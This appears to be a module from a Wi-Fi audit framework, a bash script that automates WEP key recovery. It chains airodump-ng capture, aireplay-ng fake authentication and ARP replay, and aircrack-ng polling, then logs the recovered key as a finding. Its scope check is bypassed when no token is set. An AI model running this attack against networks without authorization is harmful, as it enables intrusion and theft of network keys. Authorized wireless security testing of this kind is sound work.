#!/usr/bin/env bash
# MODULE_META
# NAME="WEP Network Cracking [Past Attacks]"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="airodump-ng,aireplay-ng,aircrack-ng"
# DESC="Detect and crack legacy WEP networks via ARP replay and fragmentation"
# REQS="monitor_iface,target_bssid,target_channel"
# PCAP="yes"
# TIMED="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d2_wep_cracking.sh
#  D2: WEP Network Cracking (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-300}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D2"
# --- Scope Guardrail ---
# Verify this module was launched by the wifi-astra controller.
# Prevents casual direct invocation against unauthorized targets.
if [[ -n "${ASTRA_SCOPE_TOKEN:-}" && -n "${GUEST_BSSID:-}" ]]; then
    if ! "$ASTRA_BIN" verify-scope \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --bssid "$GUEST_BSSID" \
            --token "$ASTRA_SCOPE_TOKEN"; then
        echo "[!] Scope guardrail failed — aborting." >&2
        exit 1
    fi
fi
# (Token absent = headless or legacy mode; guard is skipped but logged)
if [[ -z "${ASTRA_SCOPE_TOKEN:-}" && "${ASTRA_HEADLESS:-}" != "true" ]]; then
    echo "[!] WARNING: ASTRA_SCOPE_TOKEN not set. Run this module via wifi-astra start." >&2
fi
# --- End Scope Guardrail ---
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
AIRODUMP_LOG="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
AIREPLAY_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
KEY_FILE="${EVIDENCE_DIR}/${TC_ID}_key.txt"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Starting WEP cracking attempt on ${BSSID} (Channel: ${CHANNEL:-auto})..."

# 1. Start Telemetry in Background (bounded)
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "WEP capture active — ${ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5; ELAPSED=$((ELAPSED + 5))
            continue
        fi
        PCT=$(( 10 + (ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Cracking WEP network..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools
# WEP cracking sequence:
#   1. Start airodump-ng to capture IVs
#   2. Fake auth FIRST (persistent re-auth every 6s) — arpreplay requires association
#   3. Start ARP replay to generate IVs artificially
#   4. Poll aircrack-ng every 30s until enough IVs accumulate for key recovery
# Running arpreplay before fake auth causes "Not associated" and zero IV injection.
CAP_FILE="${OUTPUT_BASE}-01.cap"

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout --foreground "$SCAN_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" &
    AIRO_PID=$!

    # Fake auth first — persistent (6000ms retry interval) to stay associated
    echo "[*] Authenticating to AP (fake auth)..."
    aireplay-ng --fakeauth 6000 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
    FAKEAUTH_PID=$!
    sleep 3   # give fakeauth time to associate before starting replay

    # Now start ARP replay
    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
    AIRE_PID=$!

    ELAPSED=0
    SUCCESS=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        sleep 30; ((ELAPSED+=30))
        if [[ -f "$CAP_FILE" ]]; then
            if aircrack-ng -b "$BSSID" "$CAP_FILE" 2>&1 | tee "$KEY_FILE" | grep -q "KEY FOUND"; then
                SUCCESS=1; break
            fi
        fi
    done
    kill "$AIRO_PID" "$AIRE_PID" "$FAKEAUTH_PID" 2>/dev/null || true
else
    (
        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
        AIRO_PID=$!

        # Fake auth before ARP replay — required for injection association
        aireplay-ng --fakeauth 6000 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
        FAKEAUTH_PID=$!
        sleep 3

        aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
        AIRE_PID=$!

        ELAPSED=0
        SUCCESS=0
        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
            sleep 30; ((ELAPSED+=30))
            if [[ -f "$CAP_FILE" ]]; then
                if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1 && grep -q "KEY FOUND" "$KEY_FILE"; then
                    SUCCESS=1; break
                fi
            fi
        done
        kill "$AIRO_PID" "$AIRE_PID" "$FAKEAUTH_PID" 2>/dev/null || true
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID || true
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
SUCCESS=0
if [[ -f "$KEY_FILE" ]] && grep -q "KEY FOUND" "$KEY_FILE"; then
    SUCCESS=1
fi

if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WEP Key Recovered" \
        --severity CRITICAL \
        --desc "The cleartext WEP key was recovered for BSSID ${BSSID}." \
        --evidence "$KEY_FILE" \
        --rationale "WEP is cryptographically broken."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --severity INFO \
        --desc "Attempted to recover WEP keys for ${BSSID}." \
        --evidence "${OUTPUT_BASE}-01.cap" \
        --rationale "WEP cracking depends on high traffic volume."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
